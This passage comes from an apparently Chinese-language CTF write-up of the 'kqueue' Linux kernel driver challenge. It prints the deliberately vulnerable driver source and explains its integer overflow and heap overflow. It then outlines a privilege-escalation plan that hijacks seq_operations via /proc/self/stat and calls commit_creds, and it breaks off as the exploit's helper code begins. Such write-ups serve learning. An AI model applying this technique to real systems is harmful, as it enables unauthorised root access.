DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看一下create_kquque函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="type">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// MAX_QUEUES = 5, 最多只能分配5块空间。</span></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="comment">// MAX_DATA_SIZE = 0x20, 大小不能超过0x20</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="type">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="type">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* For Validating pointers */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">void</span>* <span class="title function_">validate</span><span class="params">(<span class="type">void</span> *ptr)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ptr)&#123;</span><br><span class="line">        mutex_unlock(&amp;operations_lock);</span><br><span class="line">        err(<span class="string">&quot;[-] oops! Internal operation error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这个函数成功创建一个kqueue的标志是在全局变量kqueues中保存新创建的kqueue。其中kqueues最多可以容纳5个kqueue。<br />
kmalloc中的第二个参数GFP_KERNEL是内存分配的一个选项，具体详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010164190/article/details/84789220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769965716781685380293%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165769965716781685380293&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-84789220-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=gfp_kernel&amp;spm=1018.2226.3001.4187">资料</a>。<br />
<code>__builtin_umulll_overflow</code>函数和<code>__builtin_saddll_overflow</code>函数是gcc中的内置函数，其作用是运算并检查是否溢出。在gcc中有一系列这样的函数，详情请见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43919932/article/details/123666702?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769979316780357217968%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165769979316780357217968&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123666702-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=__builtin_umulll_overflow&amp;spm=1018.2226.3001.4187">资料</a>。实际上函数的功能可以通过其名字得知。如<code>__builtin_umulll_overflow</code>中<code>umulll</code>的第一个u指的是无符号整数运算，mul是乘法，后面的ll是整数类型（长整型）。类似的，<code>__builtin_saddll_overflow</code>指的是有符号（s）长整型（ll）加法（add）。由此可知每一次添加kqueue，其第一个kmalloc分配的大小应该为<code>sizeof(queue) + sizeof(queue_entry) * max_entries</code>，其中max_entries代表这个队列可容纳的最大的元素个数。结构体<code>queue</code>中保存队列的基本信息，结构体<code>queue_entry</code>保存队列中一个元素的信息，每一个元素都是一个字符串，字符串的长度由传入的请求<code>request.data_size</code>决定，即一个队列中保存所有字符串的内存块大小相等。<br />
另外注意如果请求分配n个queue_entry，这个函数实际上会给你分配出n+1个entry的空间，也就是调用<code>__builtin_saddll_overflow</code>函数时乘以<code>request.max_entries+1</code>。<code>__builtin_saddll_overflow</code>函数虽然会检查乘法是否有溢出，但不能检查<code>request.max_entries+1</code>这个加法会不会溢出。如果传入的<code>request.max_entries=0xFFFFFFFF</code>，加1变成0，乘法绝对不会溢出，但这个值0xFFFFFFFF会保存到<code>queue.max_entries</code>之中，有潜在的隐患。这个时候后面的申请entries的循环一次都不会执行，即一共只分配了0x20大小（注意结构体中元素的对齐）的空间用于存放queue而没有分配空间用于queue_entry。</p>
<p>delete_kqueue函数即将空间释放，内容清零。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是edit_kqueue函数，即在第queue_idx个队列中的第entry_idx个元素中写入内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the kqueue exists at that idx */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue entry */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the kqueue entry memory */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for the existence of the kqueue entry */</span></span><br><span class="line">    exists = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="built_in">queue</span>-&gt;max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* If kqueue entry found , do the necessary */</span></span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">            <span class="keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class="line">                validate(<span class="built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">                exists = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx==<span class="number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(<span class="built_in">queue</span>-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!exists)</span><br><span class="line">        <span class="keyword">return</span> NOT_EXISTS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这是save函数，其功能是将一个队列中的所有字符串在另外一个内存块中保存。注意这里每一个字符串拷贝的大小为request.data_size，前面对request.data_size的比较仅仅是比较其是否大于整个queue的大小。因此这里存在溢出漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">save_kqueue_entries</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="type">char</span> *new_queue = validate((<span class="type">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上，我们大概理解了这个驱动的功能，其中包含了一个整型溢出漏洞和一个缓冲区溢出漏洞。接下来介绍这个漏洞应该如何利用。</p>
<p>本题的漏洞利用方式需要借助一个结构体：<code>seq_operations</code>，大小为0x20（与queue相同），包含4个指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单介绍一下这个结构体是干什么用的。这是序列文件必备的结构体，相当于一个迭代器，能够循环输出某些内容，常用于导出数据与记录，便于管理大数据文件。当一个定义了这个结构体的LKM被打开（如使用cat命令）时，内核就会创建这样的一个数据结构，并首先调用start函数指针。由于这个结构体的大小为0x20，因此其很有可能与上面的queue分配到相距不远的地方。如果能够控制这里的start指针，就能够控制内核执行流。本题打开的序列文件为/proc/self/stat。</p>
<p>下面是这题的qemu启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure>
<p>可见其开启了kaslr保护，但没有SMAP/SMEP和kpti，因此如果能够获取到内核地址的基址，就能够找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>两个函数的地址。至于如何找到内核基址，后面介绍。</p>
<p>现在，我们可以着手编写程序的交互部分了，一些通用的函数如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 